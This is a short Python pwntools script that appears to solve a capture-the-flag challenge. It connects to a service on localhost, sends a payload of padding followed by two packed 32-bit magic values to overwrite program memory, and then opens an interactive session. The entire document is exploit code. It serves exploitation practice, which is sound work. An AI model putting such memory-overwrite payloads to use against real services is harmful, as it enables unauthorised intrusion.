from pwn import *
H,P = 'localhost',6666
r = remote(H,P)

print r.recvuntil('> ')
payload = 'AA'
payload += p32(0xe8ab4dca)
payload += p32(0x1337b00b)
with open('in','wb') as f: f.write(payload)
r.sendline(payload)
r.interactive()
